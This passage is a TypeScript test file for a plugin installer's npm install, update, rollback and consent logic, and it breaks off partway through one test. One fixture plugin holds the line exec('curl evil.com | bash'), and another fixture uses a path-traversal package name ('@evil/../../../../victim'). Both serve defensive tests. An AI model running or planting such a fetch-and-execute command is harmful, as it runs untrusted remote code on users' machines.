// Covers npm spec parsing for plugin install inputs.
import fs from "node:fs";
import { createRequire } from "node:module";
import path from "node:path";
import { pathToFileURL } from "node:url";
import { afterAll, assert, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";
import {
  mockNpmViewMetadataResult,
  npmCommandFailureCases,
} from "../test-utils/npm-spec-install-test-helpers.js";
import {
  resolvePluginNpmGenerationProjectDir,
  resolvePluginNpmProjectDir,
  resolvePluginNpmProjectsDir,
} from "./install-paths.js";
import {
  requestDeferredPluginInstall,
  resolvePluginInstallTransaction,
} from "./install-transaction.js";
import type { PluginInstallArtifactConsentRequest } from "./install-types.js";
import {
  prunePluginLocalOpenClawPeerLinks,
  readTextFileTree,
  registerManagedNpmDependencyTests,
} from "./install.npm-dependencies.test-support.js";
import {
  hasRetainedManagedNpmInstallMarker,
  markRetainedManagedNpmInstall,
} from "./managed-npm-retention.js";
import { createSyncSuiteTempRootTracker } from "./test-helpers/fs-fixtures.js";
import { registerNpmUpdateMetadataTests } from "./update-npm-metadata.test-support.js";

const runCommandWithTimeoutMock = vi.fn();
const resolveOpenClawPackageRootSyncMock = vi.fn();

vi.mock("../process/exec.js", () => ({
  runCommandWithTimeout: (...args: unknown[]) => runCommandWithTimeoutMock(...args),
}));

vi.mock("../infra/openclaw-root.js", () => ({
  resolveOpenClawPackageRootSync: (...args: unknown[]) =>
    resolveOpenClawPackageRootSyncMock(...args),
}));

vi.resetModules();

const {
  installPluginFromNpmPackArchive: installPack,
  installPluginFromNpmSpec: installSpec,
  PLUGIN_INSTALL_ERROR_CODE,
} = await import("./install.js");

const suiteTempRootTracker = createSyncSuiteTempRootTracker("openclaw-plugin-install-npm-spec");
let previousNpmGlobalConfig: string | undefined;
let npmGlobalConfigPath: string;
let npmRoot: string;
const silentLogger = { info: () => {}, warn: () => {} };
function installPluginFromNpmSpec(params: Parameters<typeof installSpec>[0]) {
  return installSpec({ npmDir: npmRoot, logger: silentLogger, ...params });
}

function installPluginFromNpmPackArchive(params: Parameters<typeof installPack>[0]) {
  return installPack({ npmDir: npmRoot, logger: silentLogger, ...params });
}

function writeJson(filePath: string, value: unknown): void {
  fs.writeFileSync(filePath, `${JSON.stringify(value, null, 2)}\n`, "utf8");
}

function successfulSpawn(stdout = "") {
  return {
    code: 0,
    stdout,
    stderr: "",
    signal: null,
    killed: false,
    termination: "exit" as const,
  };
}

function failedSpawn(stderr: string, stdout = "") {
  return {
    code: 1,
    stdout,
    stderr,
    signal: null,
    killed: false,
    termination: "exit" as const,
  };
}

function npmViewArgv(spec: string): string[] {
  return [
    "npm",
    "view",
    spec,
    "name",
    "version",
    "dist.integrity",
    "dist.shasum",
    "openclaw",
    "--json",
  ];
}

function npmViewVersionsArgv(spec: string): string[] {
  return ["npm", "view", spec, "versions", "--json"];
}

function npmPackArchiveMetadataArgv(archivePath: string): string[] {
  return ["npm", "pack", archivePath, "--ignore-scripts", "--dry-run", "--json"];
}

function commandKey(argv: readonly string[]): string {
  return argv.join("\0");
}

function resolveManagedFileDependency(projectRoot: string, dependencySpec: string): string | null {
  if (!dependencySpec.startsWith("file:")) {
    return null;
  }
  const rawPath = dependencySpec.slice("file:".length);
  return path.isAbsolute(rawPath) ? rawPath : path.resolve(projectRoot, rawPath);
}

function isNpmInstallCommand(argv: unknown): argv is string[] {
  return Array.isArray(argv) && argv[0] === "npm" && argv[1] === "install";
}

function isNpmPeerPlannerInstallCommand(argv: unknown): argv is string[] {
  return isNpmInstallCommand(argv) && argv.includes("--package-lock-only");
}

function isManagedNpmInstallCommand(argv: unknown): argv is string[] {
  return isNpmInstallCommand(argv) && !isNpmPeerPlannerInstallCommand(argv);
}

function managedNpmRootHasDependency(projectRoot: string, packageName: string): boolean {
  const manifest = JSON.parse(fs.readFileSync(path.join(projectRoot, "package.json"), "utf8")) as {
    dependencies?: Record<string, string>;
  };
  return packageName in (manifest.dependencies ?? {});
}

function expectManagedNpmQuarantine(diagnostics: string[]): string {
  const installCall = runCommandWithTimeoutMock.mock.calls.find(([argv]) =>
    isManagedNpmInstallCommand(argv),
  );
  const stageRoot = installCall?.[1]?.cwd;
  if (typeof stageRoot !== "string") {
    throw new Error("expected managed npm execution root");
  }
  expect(fs.existsSync(stageRoot)).toBe(false);
  const quarantineParent = path.join(path.dirname(stageRoot), "_openclaw-quarantined-npm-projects");
  const quarantines = fs.readdirSync(quarantineParent);
  expect(quarantines).toHaveLength(1);
  const quarantineDir = path.join(quarantineParent, quarantines[0]!);
  expect(fs.statSync(quarantineDir).isDirectory()).toBe(true);
  expect(diagnostics.some((message) => message.includes(quarantineDir))).toBe(true);
  return quarantineDir;
}

function resolveTestPluginPackageDir(projectRoot: string, packageName: string): string {
  return path.join(
    resolvePluginNpmProjectDir({
      npmDir: projectRoot,
      packageName,
    }),
    "node_modules",
    ...packageName.split("/"),
  );
}

function resolveTestPluginGenerationProjectDir(params: {
  npmRoot: string;
  packageName: string;
  version: string;
  integrity?: string;
  shasum?: string;
}): string {
  return resolvePluginNpmGenerationProjectDir({
    npmDir: params.npmRoot,
    packageName: params.packageName,
    generationKey: [
      params.packageName,
      params.version,
      `${params.packageName}@${params.version}`,
      params.integrity ?? "sha512-plugin-test",
      params.shasum ?? "pluginshasum",
    ].join("\n"),
  });
}

function resolveTestPluginGenerationPackageDir(params: {
  npmRoot: string;
  packageName: string;
  version: string;
  integrity?: string;
  shasum?: string;
}): string {
  return path.join(
    resolveTestPluginGenerationProjectDir(params),
    "node_modules",
    ...params.packageName.split("/"),
  );
}

function writeInstalledNpmPlugin(params: {
  npmRoot: string;
  packageName: string;
  version: string;
  pluginId?: string;
  nativeManifest?: "missing" | "malformed";
  legacyPluginIds?: string[];
  indexJs?: string;
  extraDistFiles?: Record<string, string>;
  dependency?: { name: string; version: string };
  hoistedDependency?: { name: string; version: string };
  peerDependencies?: Record<string, string>;
  openclaw?: Record<string, unknown>;
  replaceExisting?: boolean;
}) {
  const pluginDir = path.join(params.npmRoot, "node_modules", params.packageName);
  if (params.replaceExisting) {
    fs.rmSync(pluginDir, { recursive: true, force: true });
  }
  fs.mkdirSync(path.join(pluginDir, "dist"), { recursive: true });
  writeJson(path.join(pluginDir, "package.json"), {
    name: params.packageName,
    version: params.version,
    openclaw: params.openclaw ?? { extensions: ["./dist/index.js"] },
    ...(params.dependency
      ? { dependencies: { [params.dependency.name]: params.dependency.version } }
      : {}),
    ...(params.peerDependencies ? { peerDependencies: params.peerDependencies } : {}),
  });
  if (params.nativeManifest !== "missing") {
    fs.writeFileSync(
      path.join(pluginDir, "openclaw.plugin.json"),
      params.nativeManifest === "malformed"
        ? "{invalid plugin manifest"
        : JSON.stringify({
            id: params.pluginId ?? params.packageName,
            name: params.pluginId ?? params.packageName,
            ...(params.legacyPluginIds ? { legacyPluginIds: params.legacyPluginIds } : {}),
            configSchema: { type: "object" },
          }),
      "utf-8",
    );
  }
  fs.writeFileSync(
    path.join(pluginDir, "dist", "index.js"),
    params.indexJs ?? "export {};",
    "utf-8",
  );
  for (const [relativePath, contents] of Object.entries(params.extraDistFiles ?? {})) {
    const targetPath = path.join(pluginDir, "dist", relativePath);
    fs.mkdirSync(path.dirname(targetPath), { recursive: true });
    fs.writeFileSync(targetPath, contents, "utf-8");
  }
  if (params.dependency) {
    const depDir = path.join(pluginDir, "node_modules", params.dependency.name);
    fs.mkdirSync(depDir, { recursive: true });
    writeJson(path.join(depDir, "package.json"), {
      name: params.dependency.name,
      version: params.dependency.version,
    });
  }
  if (params.hoistedDependency) {
    const depDir = path.join(params.npmRoot, "node_modules", params.hoistedDependency.name);
    fs.mkdirSync(depDir, { recursive: true });
    writeJson(path.join(depDir, "package.json"), {
      name: params.hoistedDependency.name,
      version: params.hoistedDependency.version,
    });
  }
  return pluginDir;
}

type MockNpmPackage = {
  spec?: string;
  packageName: string;
  version: string;
  npmRoot: string;
  pluginId?: string;
  nativeManifest?: "missing" | "malformed";
  legacyPluginIds?: string[];
  integrity?: string;
  shasum?: string;
  indexJs?: string;
  extraDistFiles?: Record<string, string>;
  dependency?: { name: string; version: string };
  hoistedDependency?: { name: string; version: string };
  peerDependencies?: Record<string, string>;
  openclaw?: Record<string, unknown>;
  expectedDependencySpec?: string;
  versions?: string[];
  installedVersion?: string;
  installedIntegrity?: string;
  omitViewIntegrity?: boolean;
  omitInstalledVersion?: boolean;
  omitInstalledIntegrity?: boolean;
  materializesRootOpenClaw?: boolean;
  skipLockfileEntry?: boolean;
  packArchivePath?: string;
  packTarballName?: string;
  replaceExisting?: boolean;
};

function writeNpmRootPackageLock(params: {
  npmRoot: string;
  dependencies: Record<string, string>;
  packages: MockNpmPackage[];
}) {
  const lockPackages: Record<string, unknown> = {
    "": {
      dependencies: params.dependencies,
    },
  };
  for (const pkg of params.packages) {
    if (pkg.skipLockfileEntry) {
      continue;
    }
    lockPackages[`node_modules/${pkg.packageName}`] = {
      ...(pkg.omitInstalledVersion ? {} : { version: pkg.installedVersion ?? pkg.version }),
      ...(pkg.omitInstalledIntegrity
        ? {}
        : { integrity: pkg.installedIntegrity ?? pkg.integrity ?? "sha512-plugin-test" }),
    };
    if (pkg.materializesRootOpenClaw) {
      lockPackages["node_modules/openclaw"] = {
        peer: true,
        version: "2026.5.3",
      };
    }
  }
  writeJson(path.join(params.npmRoot, "package-lock.json"), {
    lockfileVersion: 3,
    packages: lockPackages,
  });
}

function writeMissingCurrentPlatformOptionalPackage(params: {
  npmRoot: string;
  packageName: string;
  packageLocation: string;
}): void {
  const lockPath = path.join(params.npmRoot, "package-lock.json");
  const lockfile = JSON.parse(fs.readFileSync(lockPath, "utf8")) as {
    packages?: Record<string, unknown>;
  };
  lockfile.packages ??= {};
  lockfile.packages[params.packageLocation] = {
    name: params.packageName,
    version: "1.0.0-platform",
    optional: true,
    os: [process.platform],
    cpu: [process.arch],
  };
  writeJson(lockPath, lockfile);
  fs.rmSync(path.join(params.npmRoot, ...params.packageLocation.split("/")), {
    recursive: true,
    force: true,
  });
}

function mockNpmViewAndInstall(
  params: Omit<MockNpmPackage, "npmRoot" | "packageName" | "version"> & {
    spec: string;
    npmRoot?: string;
    packageName?: string;
    version?: string;
  },
) {
  const selector = params.spec.lastIndexOf("@");
  mockNpmViewAndInstallMany([
    Object.assign(params, {
      npmRoot: params.npmRoot ?? npmRoot,
      packageName:
        params.packageName ?? (selector > 0 ? params.spec.slice(0, selector) : params.spec),
      version: params.version ?? "1.0.0",
    }),
  ]);
}

function mockNpmViewAndInstallMany(packages: MockNpmPackage[]) {
  const packagesByName = new Map(packages.map((pkg) => [pkg.packageName, pkg]));
  const packPackagesByArgv = new Map(
    packages
      .filter((pkg) => pkg.packArchivePath)
      .map((pkg) => [commandKey(npmPackArchiveMetadataArgv(pkg.packArchivePath ?? "")), pkg]),
  );
  const viewPackagesByArgv = new Map(
    packages.filter((pkg) => pkg.spec).map((pkg) => [commandKey(npmViewArgv(pkg.spec ?? "")), pkg]),
  );
  const versionsPackagesByArgv = new Map(
    packages
      .filter((pkg) => pkg.versions)
      .map((pkg) => [commandKey(npmViewVersionsArgv(pkg.packageName)), pkg]),
  );
  runCommandWithTimeoutMock.mockImplementation(
    async (argv: string[], options?: { cwd?: string }) => {
      const argvKey = commandKey(argv);
      const packPackage = packPackagesByArgv.get(argvKey);
      if (packPackage) {
        return successfulSpawn(
          JSON.stringify([
            {
              id: `${packPackage.packageName}@${packPackage.version}`,
              name: packPackage.packageName,
              version: packPackage.version,
              filename:
                packPackage.packTarballName ??
                `${packPackage.packageName.replace(/^@/, "").replace("/", "-")}-${packPackage.version}.tgz`,
              integrity: packPackage.integrity ?? "sha512-plugin-test",
              shasum: packPackage.shasum ?? "pluginshasum",
            },
          ]),
        );
      }
      const viewPackage = viewPackagesByArgv.get(argvKey);
      if (viewPackage) {
        return successfulSpawn(
          JSON.stringify({
            name: viewPackage.packageName,
            version: viewPackage.version,
            dist: {
              ...(viewPackage.omitViewIntegrity
                ? {}
                : { integrity: viewPackage.integrity ?? "sha512-plugin-test" }),
              shasum: viewPackage.shasum ?? "pluginshasum",
            },
            ...(viewPackage.openclaw ? { openclaw: viewPackage.openclaw } : {}),
          }),
        );
      }
      const versionsPackage = versionsPackagesByArgv.get(argvKey);
      if (versionsPackage) {
        return successfulSpawn(
          JSON.stringify(versionsPackage.versions ?? [versionsPackage.version]),
        );
      }
      if (isNpmPeerPlannerInstallCommand(argv)) {
        const projectRoot = options?.cwd;
        if (!projectRoot) {
          throw new Error(`unexpected npm peer planner command: ${argv.join(" ")}`);
        }
        const manifest = JSON.parse(
          fs.readFileSync(path.join(projectRoot, "package.json"), "utf8"),
        ) as {
          dependencies?: Record<string, string>;
        };
        writeNpmRootPackageLock({
          npmRoot: projectRoot,
          dependencies: manifest.dependencies ?? {},
          packages: Object.keys(manifest.dependencies ?? {})
            .map((packageName) => packagesByName.get(packageName))
            .filter((pkg): pkg is MockNpmPackage => Boolean(pkg)),
        });
        return successfulSpawn();
      }
      if (isManagedNpmInstallCommand(argv)) {
        const projectRoot = options?.cwd;
        if (!projectRoot) {
          throw new Error(`unexpected npm install command: ${(argv as string[]).join(" ")}`);
        }
        const manifest = JSON.parse(
          fs.readFileSync(path.join(projectRoot, "package.json"), "utf8"),
        ) as {
          dependencies?: Record<string, string>;
        };
        const installedPackages: MockNpmPackage[] = [];
        prunePluginLocalOpenClawPeerLinks(projectRoot);
        for (const packageName of Object.keys(manifest.dependencies ?? {})) {
          if (packageName === "openclaw") {
            const openclawRoot = path.join(projectRoot, "node_modules", "openclaw");
            fs.mkdirSync(openclawRoot, { recursive: true });
            writeJson(path.join(openclawRoot, "package.json"), {
              name: "openclaw",
              version: "0.0.0-test",
            });
            continue;
          }
          const pkg = packagesByName.get(packageName);
          if (!pkg) {
            throw new Error(`unexpected managed npm dependency: ${packageName}`);
          }
          const dependencySpec = manifest.dependencies?.[packageName];
          if (pkg.expectedDependencySpec && dependencySpec !== pkg.expectedDependencySpec) {
            throw new Error(
              `expected managed npm dependency ${packageName}@${pkg.expectedDependencySpec}, got ${dependencySpec ?? ""}`,
            );
          }
          const fileDependencyPath = dependencySpec
            ? resolveManagedFileDependency(projectRoot, dependencySpec)
            : null;
          if (fileDependencyPath && !fs.existsSync(fileDependencyPath)) {
            throw new Error(`missing managed npm file dependency: ${fileDependencyPath}`);
          }
          writeInstalledNpmPlugin({
            ...pkg,
            npmRoot: projectRoot,
            version: pkg.installedVersion ?? pkg.version,
          });
          if (pkg.materializesRootOpenClaw) {
            const openclawRoot = path.join(projectRoot, "node_modules", "openclaw");
            fs.mkdirSync(openclawRoot, { recursive: true });
            writeJson(path.join(openclawRoot, "package.json"), {
              name: "openclaw",
              version: "2026.5.3",
            });
          }
          installedPackages.push(pkg);
        }
        writeNpmRootPackageLock({
          npmRoot: projectRoot,
          dependencies: manifest.dependencies ?? {},
          packages: installedPackages,
        });
        return successfulSpawn();
      }
      if (argv[0] === "npm" && argv[1] === "uninstall") {
        const packageName = (argv as string[]).at(-1);
        if (packageName === "openclaw") {
          const projectRoot = options?.cwd;
          if (!projectRoot) {
            throw new Error(`unexpected npm uninstall command: ${(argv as string[]).join(" ")}`);
          }
          fs.rmSync(path.join(projectRoot, "node_modules", "openclaw"), {
            recursive: true,
            force: true,
          });
          return successfulSpawn();
        }
        const pkg = packageName ? packagesByName.get(packageName) : undefined;
        if (!pkg) {
          throw new Error(`unexpected npm uninstall package: ${packageName ?? ""}`);
        }
        fs.rmSync(
          path.join(options?.cwd ?? pkg.npmRoot, "node_modules", ...pkg.packageName.split("/")),
          {
            recursive: true,
            force: true,
          },
        );
        return successfulSpawn();
      }
      throw new Error(`unexpected command: ${(argv as string[]).join(" ")}`);
    },
  );
}

beforeAll(() => {
  previousNpmGlobalConfig = process.env.NPM_CONFIG_GLOBALCONFIG;
  npmGlobalConfigPath = path.join(suiteTempRootTracker.makeTempDir(), "global-npmrc");
  fs.writeFileSync(npmGlobalConfigPath, "", "utf8");
  process.env.NPM_CONFIG_GLOBALCONFIG = npmGlobalConfigPath;
});

afterAll(() => {
  if (previousNpmGlobalConfig === undefined) {
    delete process.env.NPM_CONFIG_GLOBALCONFIG;
  } else {
    process.env.NPM_CONFIG_GLOBALCONFIG = previousNpmGlobalConfig;
  }
  suiteTempRootTracker.cleanup();
});

beforeEach(() => {
  npmRoot = path.join(suiteTempRootTracker.makeTempDir(), "npm");
  runCommandWithTimeoutMock.mockReset();
  resolveOpenClawPackageRootSyncMock.mockReset();
  const hostRoot = suiteTempRootTracker.makeTempDir();
  writeJson(path.join(hostRoot, "package.json"), { name: "openclaw", version: "0.0.0-test" });
  resolveOpenClawPackageRootSyncMock.mockReturnValue(hostRoot);
  vi.unstubAllEnvs();
  process.env.NPM_CONFIG_GLOBALCONFIG = npmGlobalConfigPath;
});

describe("installPluginFromNpmSpec", () => {
  registerNpmUpdateMetadataTests({
    getNpmRoot: () => npmRoot,
    installPluginFromNpmSpec,
    isManagedNpmInstallCommand,
    mockNpmViewAndInstallMany,
    runCommandWithTimeoutMock,
    writeInstalledNpmPlugin,
  });

  it.each(npmCommandFailureCases.filter(({ label }) => label === "signal without output"))(
    "classifies metadata failures with $label",
    async ({ npmResult, expectedDetail }) => {
      runCommandWithTimeoutMock.mockResolvedValue(npmResult);

      await expect(
        installPluginFromNpmSpec({
          spec: "@openclaw/voice-call@0.0.1",
          npmDir: path.join(suiteTempRootTracker.makeTempDir(), "npm"),
        }),
      ).resolves.toEqual({
        ok: false,
        error: `npm view failed: ${expectedDetail}`,
        code: PLUGIN_INSTALL_ERROR_CODE.NPM_METADATA_FAILURE,
      });
    },
  );

  it("continues when the managed generation scan reports ENOTDIR", async () => {
    const packageName = "scan-recovery-plugin";
    mockNpmViewAndInstall({
      spec: `${packageName}@1.0.0`,
    });
    const error = Object.assign(new Error("not a directory"), { code: "ENOTDIR" });
    const readdirSpy = vi.spyOn(fs.promises, "readdir").mockRejectedValueOnce(error);

    try {
      const result = await installPluginFromNpmSpec({
        spec: `${packageName}@1.0.0`,
      });

      expect(result.ok).toBe(true);
      expect(readdirSpy).toHaveBeenCalledWith(resolvePluginNpmProjectsDir(npmRoot), {
        withFileTypes: true,
      });
    } finally {
      readdirSpy.mockRestore();
    }
  });

  it("rejects npm pack archive metadata with traversal package names", async () => {
    const stateDir = suiteTempRootTracker.makeTempDir();
    npmRoot = path.join(stateDir, "npm");
    const victimDir = path.join(stateDir, "victim");
    const archivePath = path.join(stateDir, "evil-pack-1.0.0.tgz");
    fs.mkdirSync(victimDir, { recursive: true });
    fs.writeFileSync(path.join(victimDir, "keep.txt"), "keep", "utf8");
    fs.writeFileSync(archivePath, "fixture pack contents", "utf8");

    mockNpmViewAndInstallMany([
      {
        packageName: "@evil/../../../../victim",
        version: "1.0.0",
        npmRoot,
        packArchivePath: archivePath,
      },
    ]);

    const result = await installPluginFromNpmPackArchive({
      archivePath,
      mode: "update",
    });

    if (result.ok) {
      throw new Error("expected traversal package metadata to be rejected");
    }
    expect(result.code).toBe(PLUGIN_INSTALL_ERROR_CODE.INVALID_NPM_SPEC);
    expect(result.error).toContain("unsupported npm pack package name");
    expect(fs.existsSync(path.join(victimDir, "keep.txt"))).toBe(true);
    expect(fs.existsSync(path.join(npmRoot, "package.json"))).toBe(false);
    expect(fs.existsSync(path.join(npmRoot, "_openclaw-pack-archives"))).toBe(false);
    expect(runCommandWithTimeoutMock.mock.calls).toHaveLength(1);
  });

  it("keeps the existing install target untouched while artifact consent runs", async () => {
    const packageName = "stage-consent-plugin";
    const fixture = (version: string) => ({
      spec: `${packageName}@${version}`,
      packageName,
      version,
      pluginId: packageName,
      npmRoot,
      replaceExisting: true,
      indexJs: "export const value = 'validated';\n",
    });
    let targetDir = resolveTestPluginPackageDir(npmRoot, packageName);

    for (const version of ["1.0.0", "2.0.0"]) {
      mockNpmViewAndInstall(fixture(version));
      const installed = await installPluginFromNpmSpec({
        spec: `${packageName}@${version}`,
        mode: "update",
      });
      assert(installed.ok, JSON.stringify(installed));
      targetDir = installed.targetDir;
    }
    fs.writeFileSync(path.join(targetDir, "before-consent.txt"), "keep until consent", "utf8");

    const projectRoot = path.dirname(path.dirname(targetDir));
    const projectBefore = readTextFileTree(projectRoot);
    mockNpmViewAndInstall(fixture("2.0.0"));
    const onBeforePluginArtifactCommit = vi.fn(
      async (artifact: PluginInstallArtifactConsentRequest) => {
        expect(fs.existsSync(targetDir)).toBe(true);

        expect(readTextFileTree(projectRoot)).toEqual(projectBefore);
        expect(artifact.currentArtifactDir).toBe(targetDir);

        expect(artifact.stagedArtifactDir).not.toBe(targetDir);
        expect(fs.existsSync(path.join(artifact.stagedArtifactDir, "package.json"))).toBe(true);
      },
    );
    const result = await installPluginFromNpmSpec({
      spec: `${packageName}@2.0.0`,
      mode: "update",
      onBeforePluginArtifactCommit,
    });
    expect(result.ok).toBe(true);
    expect(onBeforePluginArtifactCommit).toHaveBeenCalledTimes(1);
    if (result.ok) {
      expect(result.targetDir).toBe(targetDir);
      expect(fs.readFileSync(path.join(targetDir, "dist", "index.js"), "utf8")).toBe(
        "export const value = 'validated';\n",
      );
    }
  });

  it("preserves a successor npm-pack project when an older install loses ownership", async () => {
    const stateDir = suiteTempRootTracker.makeTempDir();
    const packageName = "rollback-owner-plugin";
    const expired = new Error("install owner closed");
    let ownerActive = true;
    const assertOwned = () => {
      if (!ownerActive) {
        throw expired;
      }
    };
    const install = async (version: string, guard = () => {}) => {
      const spec = `${packageName}@${version}`;
      const archivePath = path.join(stateDir, `${packageName}-${version}.tgz`);
      fs.writeFileSync(archivePath, `archive ${version}`, "utf8");
      mockNpmViewAndInstallMany([
        { spec, packArchivePath: archivePath, packageName, version, npmRoot },
      ]);
      const params = requestDeferredPluginInstall(
        { npmDir: npmRoot, mode: "update" as const },
        undefined,
        guard,
      );
      const result = await installPluginFromNpmPackArchive({ ...params, archivePath });
      if (!result.ok) {
        throw new Error(result.error);
      }
      const transaction = resolvePluginInstallTransaction(result);
      if (!transaction) {
        throw new Error("expected deferred npm install");
      }
      return { result, transaction };
    };

    const initial = await install("1.0.0");
    await initial.transaction.commit();
    const older = await install("2.0.0", assertOwned);
    ownerActive = false;
    const successor = await install("2.0.0");
    await successor.transaction.commit();
    expect(successor.result.targetDir).toBe(older.result.targetDir);
    const projectRoot = resolveTestPluginGenerationProjectDir({
      npmRoot,
      packageName,
      version: "2.0.0",
    });
    const projectBefore = readTextFileTree(projectRoot);
    expect(Object.keys(projectBefore).some((file) => file.endsWith(".tgz"))).toBe(true);

    const rollbackError = await older.transaction.rollback().then(
      () => undefined,
      (error: unknown) => error,
    );
    expect.soft(rollbackError).toBe(expired);
    expect(fs.existsSync(projectRoot)).toBe(true);
    expect(readTextFileTree(projectRoot)).toEqual(projectBefore);
  });

  it("rolls back staged npm pack updates", async () => {
    const stateDir = suiteTempRootTracker.makeTempDir();
    const packageName = "@openclaw/pack-demo";
    const archiveV1Path = path.join(stateDir, "openclaw-pack-demo-1.0.0.tgz");
    const archiveV2Path = path.join(stateDir, "openclaw-pack-demo-2.0.0.tgz");
    fs.writeFileSync(archiveV1Path, "v1 pack contents", "utf8");
    fs.writeFileSync(archiveV2Path, "v2 pack contents", "utf8");

    mockNpmViewAndInstallMany([
      {
        packageName,
        version: "1.0.0",
        pluginId: "pack-demo",
        npmRoot,
        integrity: "sha512-pack-demo-v1",
        shasum: "packdemoshav1",
        packArchivePath: archiveV1Path,
        indexJs: "export const ok = true;",
      },
    ]);

    const safeInstall = await installPluginFromNpmPackArchive({
      archivePath: archiveV1Path,
    });
    expect(safeInstall.ok).toBe(true);
    const npmProjectRoot = resolvePluginNpmProjectDir({
      npmDir: npmRoot,
      packageName,
    });
    const projectBefore = readTextFileTree(npmProjectRoot);

    mockNpmViewAndInstallMany([
      {
        packageName,
        version: "2.0.0",
        pluginId: "pack-demo",
        npmRoot,
        integrity: "sha512-pack-demo-v2",
        shasum: "packdemoshav2",
        packArchivePath: archiveV2Path,
        indexJs: `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
      },
    ]);

    const update = await installPluginFromNpmPackArchive(
      requestDeferredPluginInstall({
        archivePath: archiveV2Path,
        mode: "update",
      }),
    );

    assert(update.ok, JSON.stringify(update));
    const updateGenerationRoot = resolvePluginNpmGenerationProjectDir({
      npmDir: npmRoot,
      packageName,
      generationKey: [
        packageName,
        "2.0.0",
        `${packageName}@2.0.0`,
        "sha512-pack-demo-v2",
        "packdemoshav2",
      ].join("\n"),
    });
    expect(readTextFileTree(npmProjectRoot)).toEqual(projectBefore);
    expect(readTextFileTree(updateGenerationRoot)).not.toEqual(projectBefore);
    const transaction = resolvePluginInstallTransaction(update);
    expect(transaction).toBeDefined();
    await transaction?.rollback();
    expect(
      fs.existsSync(path.join(updateGenerationRoot, "node_modules", "@openclaw", "pack-demo")),
    ).toBe(false);
    expect(readTextFileTree(npmProjectRoot)).toEqual(projectBefore);
  });

  it.each(["rollback", "publication failure", "abort during consent"] as const)(
    "settles a same-generation project replacement with %s",
    async (settlement) => {
      const packageName = "same-generation-plugin";
      const install = (version: string) =>
        installPluginFromNpmSpec({
          spec: `${packageName}@${version}`,
          mode: "update",
        });
      let targetDir = "";
      for (const version of ["1.0.0", "2.0.0"]) {
        mockNpmViewAndInstall({ spec: `${packageName}@${version}`, packageName, version, npmRoot });
        const installed = await install(version);
        assert(installed.ok, JSON.stringify(installed));
        targetDir = installed.targetDir;
      }
      const projectRoot = path.dirname(path.dirname(targetDir));
      const manifestPath = path.join(projectRoot, "package.json");
      const manifest = JSON.parse(fs.readFileSync(manifestPath, "utf8")) as {
        overrides?: Record<string, string>;
        openclaw?: { managedPeerDependencies: string[]; managedOverrides: string[] };
      };
      manifest.overrides = { "existing-override": "1.0.0" };
      manifest.openclaw = {
        managedPeerDependencies: ["original-peer"],
        managedOverrides: ["existing-override"],
      };
      writeJson(manifestPath, manifest);
      fs.writeFileSync(path.join(projectRoot, "original.txt"), "original bytes");
      const original = readTextFileTree(projectRoot);
      mockNpmViewAndInstall({
        spec: `${packageName}@2.0.0`,
        version: "2.0.0",
        indexJs: "export const replacement = true;\n",
      });
      const controller = new AbortController();
      let stageRoot = "";
      let refusedPublication = false;
      const rename = fs.promises.rename.bind(fs.promises);
      const renameSpy = vi.spyOn(fs.promises, "rename").mockImplementation(async (from, to) => {
        if (settlement === "publication failure" && from === stageRoot && to === projectRoot) {
          refusedPublication = true;
          throw Object.assign(new Error("publication refused"), { code: "EIO" });
        }
        return rename(from, to);
      });
      let updated: Awaited<ReturnType<typeof installPluginFromNpmSpec>>;
      try {
        updated = await installPluginFromNpmSpec(
          requestDeferredPluginInstall({
            spec: `${packageName}@2.0.0`,
            mode: "update" as const,
            signal: controller.signal,
            onBeforePluginArtifactCommit: async (artifact: PluginInstallArtifactConsentRequest) => {
              stageRoot = path.dirname(path.dirname(artifact.stagedArtifactDir));
              expect(readTextFileTree(projectRoot)).toEqual(original);
              if (settlement === "abort during consent") {
                controller.abort();
              }
            },
          }),
        );
      } finally {
        renameSpy.mockRestore();
      }
      if (settlement === "abort during consent") {
        expect(controller.signal.aborted).toBe(true);
        expect(readTextFileTree(projectRoot)).toEqual(original);
        expect(updated.ok).toBe(false);
        expect(fs.existsSync(stageRoot)).toBe(false);
        return;
      }
      if (settlement === "publication failure") {
        expect(refusedPublication).toBe(true);
        expect(updated).toMatchObject({
          ok: false,
          error: expect.stringContaining("publication refused"),
        });
        expect(readTextFileTree(projectRoot)).toEqual(original);
        expect(fs.existsSync(stageRoot)).toBe(false);
        return;
      }
      assert(updated.ok, JSON.stringify(updated));
      expect(updated.targetDir).toBe(targetDir);
      expect(fs.readFileSync(path.join(targetDir, "dist", "index.js"), "utf8")).toContain(
        "replacement",
      );
      const transaction = resolvePluginInstallTransaction(updated);
      expect(transaction).toBeDefined();
      await transaction?.rollback();
      expect(readTextFileTree(projectRoot)).toEqual(original);
    },
  );

  it("runs managed npm installs with the bundled npm CLI under Bun", async () => {
    const npmCliPath = path.join(
      path.dirname(createRequire(import.meta.url).resolve("npm/package.json")),
      "bin/npm-cli.js",
    );
    const execPath = process.execPath;
    mockNpmViewAndInstall({
      spec: "@openclaw/voice-call@0.0.1",
      version: "0.0.1",
      pluginId: "voice-call",
    });
    const mockNpmCommand = runCommandWithTimeoutMock.getMockImplementation()!;
    runCommandWithTimeoutMock.mockImplementation((argv: string[], options: unknown) =>
      mockNpmCommand(
        argv[0] === execPath && argv[1] === npmCliPath ? ["npm", ...argv.slice(2)] : argv,
        options,
      ),
    );
    vi.stubGlobal("process", {
      ...process,
      versions: { ...process.versions, bun: "1.4.2" },
    });
    try {
      const result = await installPluginFromNpmSpec({
        spec: "@openclaw/voice-call@0.0.1",
      });
      expect(result.ok).toBe(true);
      expect(runCommandWithTimeoutMock).toHaveBeenCalledWith(
        [
          execPath,
          npmCliPath,
          "install",
          "--omit=dev",
          "--omit=peer",
          "--legacy-peer-deps",
          "--loglevel=error",
          "--ignore-scripts",
          "--no-audit",
          "--no-fund",
        ],
        expect.objectContaining({ cwd: expect.any(String) }),
      );
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it("keeps lazy imports from a loaded old npm generation available across updates", async () => {
    const packageName = "@openclaw/codex";
    mockNpmViewAndInstall({
      spec: `${packageName}@1.0.0`,
      pluginId: "codex",
      integrity: "sha512-codex-v1",
      shasum: "codexv1sha",
      indexJs: `module.exports = {
  version: "v1",
  runAttempt: async () => (await import("./run-attempt-old.js")).default,
};\n`,
      extraDistFiles: {
        "run-attempt-old.js": "module.exports = { chunk: 'old' };\n",
      },
      expectedDependencySpec: "1.0.0",
    });

    const first = await installPluginFromNpmSpec({
      spec: `${packageName}@1.0.0`,
    });

